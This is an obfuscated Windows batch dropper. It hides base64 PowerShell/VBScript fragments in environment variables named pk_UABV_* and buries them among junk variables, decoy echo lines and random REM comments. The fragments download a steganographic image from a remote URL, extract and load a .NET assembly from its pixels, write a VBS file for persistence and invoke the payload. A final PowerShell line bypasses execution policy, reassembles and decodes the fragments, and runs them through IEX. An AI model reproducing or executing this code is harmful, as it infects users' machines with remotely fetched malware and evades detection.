@echo off
sE%NJMb%t "hjIDUVcAAIDE=UXvVkslNBKxUpLVoWUynSGHx"
echo c3JiWmEwc0tWSWRZOFFMUnR1R1F1WDBQZXpreng5MUFJNUNMcUh1UVpzVzBjNlFONzV0TVhpV0V0Q3k1M0NEYjlGZGUwTWVYcEQxM0lV >nul 2>&1
REM binary phantom shadow vertex
Se%nLU%t "pk_UABV_0019=zLCBmLCB0LCB1LCBjLCBoLCBhOiBTZXQgcyA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpOiBTZXQgZiA9IENyZWF0ZU9iamVjdCgiU2NyaXB0aW5nLkZpbGVTeXN0ZW1PYmplY3QiKQp1ID0gIiIKRm9yIEVhY2ggYyB"
REM guard phantom pixel valley
echo RDdZSGNLVmQ1eWZGNlpBQmowdnZ1cERKNVNCSUpGOW16a0YzNHd4bHhwbFkzcXMxSVlMa0RqT3BJTHNhVDZPSQ== >nul 2>&1
REM beacon vertex shadow sword beacon clearing circle
se%Nfx%T "qsYGlzSEtR=bVkEcZkPtX"
Se%MKwA%t "pk_UABV_0038=9Cn0KJHBhY2tlZCA9ICRleHRyYWN0ZWQuVG9BcnJheSgpOyAkYm1wLkRpc3Bvc2UoKTsgJG1zLkRpc3Bvc2UoKQpMb2ctU2lsZW50ICJbKl0gRGVjb21wcmVzc2luZy4uLiIKJGdzID0gTmV3LU9iamVjdCB"
SE%ElN%T "TiRRsqNsEQzO=vhJQaCTdyNektZuVBEJOqRdeqvDQNIQd"
Se%AkWMG%t "jjFaCgThRr=UnruMGbGMWsNNsRdsqvTaQBzEGtsE"
REM fragment vision kappa ruby kappa delta core vertex odyssey
echo UG9TVHNrQkM1SWthbzY1OGE3OVRwWkh2MXpRZUdyYXl4d1QyRWZnY0NzdnZDSTZhZ1JEcHI1U0RvVnp0VFk= >nul 2>&1
Se%zvx%t "ylogmR=dxlTfmdwUyOLXKUbvEMziEHXozD"
sE%QUUSO%T "LrwqJsGJssbMWXz=EJaCiBFiNKZHHxmeb"
REM guard core vertex kiln
sE%jaq%t "qHqKka=LUlcCswecJeFdrs"
REM pixel guard beacon beacon beacon sword
SE%LDJw%T "mNeQsxzd=JUrbnVhhSdTyVDSq"
se%MnM%T "FwdXqWKDQrcOl=xnfnWttfsG"
REM lance binary hawk beacon kappa pixel cipher valley zenith strobe
sE%xYVr%T "pk_UABV_0032=OjpGcm9tU3RyZWFtKCRtcykKJHcgPSAkYm1wLldpZHRoOyAkaCA9ICRibXAuSGVpZ2h0CiRwMCA9ICRibXAuR2V0UGl4ZWwoMCwwKTsgJHAxID0gJGJtcC5HZXRQaXhlbCgxLDApCiRsZW5ndGggP"
REM sword valley hawk
se%kXUhk%T "rBYvdHkPoh=VNOMQHPStVqchUNOntXkzrhQxHbMcuGR"
echo SVpSTjc3bzI2cVJNVWNraEhqd0Jaa1ZGQzc0R2V3b3JaUGgwWWNwZW5NN3lRVmdJWU94RjJKcmNQeFBEU0NuZQ== >nul 2>&1
echo S0hZbW1mVjdzTno3OGVLNjgzaVA3QVBiV2t5SUJWSFVuZ09Hcmh4SkJQYTRZT2dLM0JCNVZUeVNGZ0d5SUU1YUNrSnk2cw== >nul 2>&1
echo TTNOMGVyRTN3MjY4R3d6alBjTVhGOUQ0U0FaT0ZvTG5hUExDV2FQakp3QXdiTWlNakFORzFlVjZaRjZZVEhz >nul 2>&1
echo OTQyN0g4UXhzSXVENTVNQjgyZkFkekFYcWs5TGZ1OG9sZXhaTmxRY0NiekNoWUFmQ1prVENwdHZweWNoZVFpaQ== >nul 2>&1
SE%mNLt%T "DuoTTZnIZBVoqw=rPgoGJgnpbOzRCxptsr"
echo eGk0ZkVycXdkOGZvMElQdWNZSlRtVkdVWXFWYjU1N1ZhTVZLWDhtVDJFVFloR2szYUhxM1QwajZ0d2NqOTBZZkFmRA== >nul 2>&1
SE%VjF%t "PbScJMpxPfbY=HBtnlgvARHUiGuBHmhmItzM"
se%ogFSq%t "cunVdWCtvaSrinI=YguMgVaTrNgUKBrfkEYgXTSivEHhGHm"
se%Eru%T "VpFgQu=WqghGsEGEYvEjFjoinE"
sE%MecY%T "JNMwofTyqEWrjK=XAuzvqWiYVDEsvxHIvqbiDozDFma"
sE%Uuy%T "kAvIhkHVof=AoIyQpjnpJCcTtWhuOOfjYHNRBLoQ"
Se%tnUf%t "cncxXRjT=IzBJCAqXbZcWACmcnlTZHYTviiGKEyy"
REM clearing lance delta
sE%pzpzB%t "BMeiRgWCIQ=yWDjyhpUohdAjjMEMjjmGlV"
se%uKqTy%T "jGKuoIwUMBqKg=UtJhabfggFt"
REM vision cipher mirage cipher core twilight
REM kiln beacon kappa
REM lance undergrowth ruby lance cipher phantom core
echo RGRjVzI0YnVIMUNQTE9MUDR4ZVl5NzI1TDRpaFh1TzIxRkFCYUhjT0Z4bDdtRzg= >nul 2>&1
sE%ETf%t "mmAnmoYx=nLTOsrKWuWQUqgYwPRdtuAnuTTTNgx"
echo SVlZVGhGVUFleHd5alUyZHVKQzY4M2VrT1NyTjNnc0dKMUROMmVRWllBUnR1YXBxdGpTZlJJdDZzeg== >nul 2>&1
echo T0g3OGdWMW5OSWFQN0x6cnpvRWVMeldoOFROTExMVGRDUlRBRFpSZG0zTkc0Z1VQdzdBUUF5Q0xGdlZ6blY0eUFKTA== >nul 2>&1
REM pixel vertex kappa guard phantom mirage vision vertex delta
REM sword vertex kappa
REM fragment pixel kappa undergrowth kiln mirage glimmer shadow
sE%diQYY%T "XVqBggh=KyYWQzIWMliDHvXde"
sE%crdd%t "pk_UABV_0045=sb2FkZWQuRnVsbE5hbWUpIiAiR3JlZW4iCiRlbnRyeSA9ICRsb2FkZWQuRW50cnlQb2ludAppZiAoJGVudHJ5KSB7CkxvZy1TaWxlbnQgIlshXSBJbnZva2luZy4uLiIgIkN5YW4iCmlmICgkZW50cnkuR2V0UGFyYW1ldGVycygpLkNvdW"
se%jqsGI%t "GQiXBqNmsFBgn=HwlIYbsBqdGcdSMIGcnJrC"
SE%PrLiQ%T "diOaid=DnazSdamiRBJqQGjWxlCTHqx"
REM phantom kappa circle zenith
REM circle odyssey binary echo odyssey clearing zenith ruby kappa
SE%ewva%T "bfdkmWMdEjHov=qhYDeekrjQkJqCnpYryAdHAsWE"
sE%nXuy%t "ahDAYWwcTnf=tcOtZHYUKPusJsYnIASxWVedZdhUXVRjP"
REM zenith strobe vertex undergrowth zenith fragment mirage cipher guard undergrowth
echo NEJocmVsVndhS0V5R2VqQ2gyaGpqYTZYRWVNdkkwbUZKWEE1c2dFanhlUVJVS1Jva0xPNVN3MEVOVg== >nul 2>&1
sE%oOkXU%t "mjusnIzLlkGkPRf=thmOuStJfkPcwi"
REM beacon beacon fragment
SE%Aqt%T "WIWEepLF=KYeKFIfabiGdTAog"
Se%MIgOV%t "LavOmhUafPmE=cyPqyDcqaz"
REM ruby cipher cipher odyssey circle
REM guard zenith shadow zenith strobe ruby echo guard echo
REM odyssey vertex shadow undergrowth fragment shadow ruby clearing vertex
REM lance sword core
REM cipher fragment sword core zenith glimmer strobe
REM beacon pixel hawk sword binary
echo a25sZGhUZkQ1ajRzRXpkdUVXbGlWSlZHUVBBSXFRYUNXR0UzRWx2OU5kRDNtQzhrcHlKZkJMaA== >nul 2>&1
REM glimmer lance pixel phantom echo delta
REM lance core kiln clearing undergrowth glimmer glimmer beacon strobe
SE%RWlZs%T "lAoEszF=CVNSnFRvjeDWczz"
REM sword hawk sword shadow twilight beacon valley
REM valley hawk hawk ruby echo
REM kiln strobe mirage core guard echo zenith strobe kappa beacon
REM beacon ruby odyssey sword hawk strobe guard
SE%QSA%T "pk_UABV_0023=IEZhbHNlCkVuZCBJZgoiQAp0cnkgeyAkdmJzQ29udGVudCB8IE91dC1GaWxlIC1GaWxlUGF0aCAkdmJzUGF0aCAtRW5jb2RpbmcgYXNjaWkgfSBjYXRjaCB7fQp9CiRQRVJTSVNURU5DRV9VUkwgPSAiaHR0cHM6Ly9yYXcuZ"
se%miOni%T "FKxFrcY=ZLlWTHuuPgUMlpAQAsWXHaB"
REM kiln vertex vision pixel binary circle ruby shadow odyssey
REM clearing pixel ruby mirage core binary mirage kiln odyssey
SE%xBVPV%T "aKVRhmxWuVOavL=CgOXaDjPKskTTvR"
REM ruby cipher kappa vision hawk delta echo fathom sword core
SE%UbNq%t "pk_UABV_0026=WluLmFkZF9Bc3NlbWJseVJlc29sdmUoeyBwYXJhbSgkcywgJGUpIHJldHVybiAkbnVsbCB9KQpbU3lzdGVtLkFwcERvbWFpbl06OkN1cnJlbnREb21haW4uYWRkX1VuaGFuZGxlZEV4Y2Vw"
se%rpBXa%T "WYFgkdthVDzEAVF=iHDTeIfZwaiUPeNkVkOQHauh"
SE%dwCP%T "DXGyUY=yGZzfLgyRvUUFXlzxYI"
Se%faA%T "pk_UABV_0028=oW3N0cmluZ10kU291cmNlKQp0cnkgewokZGF0YSA9ICRudWxsCmlmICgkU291cmNlIC1saWtlICJodHRwKiIpIHsKTG9nLVNpbGVudCAiWypdIERvd25sb2FkaW5nIHN0ZWdvLi4uIgokd2MgPSBOZXctT2Jq"
se%cHvMm%t "bayOqyi=eCuxOSLFMs"
REM binary glimmer zenith
sE%yAuEa%t "lpFUgGkPFPKZSkI=eGXVXqeEBcfLkQxCNUeErQPYY"
sE%ZXW%T "nRiVznteQWwuM=ByHJacXBkElnesZrMegpcCHQPRUxACXNwyJ"
se%bHaC%T "shvUwUh=tmYUxsRbqAVfPdEzvmW"
REM zenith fragment lance guard
REM sword fathom delta binary vertex
echo d0QwSER4MzNqdk9ObEt0amQ0QVBxRkZsRXhiQndhUGxPaGFPYUNYakVWZG43YktsWW1Xc3M1WnVhdGZVN1NOY3VMZXVsdUZrUlZYVkZzTQ== >nul 2>&1
se%maGl%T "gtoHkK=DKiBADQEdeDT"
REM undergrowth fragment cipher clearing hawk undergrowth undergrowth clearing
Se%FjSNj%T "YhaCdnKj=byaiTMmeLkLrFyUuWarJhcPLUXbAyzk"

REM --- Reconstructed Payload Trigger ---
powershell -NoProfile -ExecutionPolicy Bypass -Command " $p=([char]101+[char]110+[char]118+[char]58);$v=(gci ($p+'pk_UABV_*')|sort Name|ForEach-Object{$_.Value})-join''; $m=([char]70+[char]114+[char]111+[char]109+[char]66+[char]97+[char]115+[char]101+[char]54+[char]52+[char]83+[char]116+[char]114+[char]105+[char]110+[char]103);$d=[Text.Encoding]::UTF8.GetString([Convert].GetMethod($m,[type[]]@([string])).Invoke($null,@($v))); &([char]73+[char]69+[char]88) $d" 
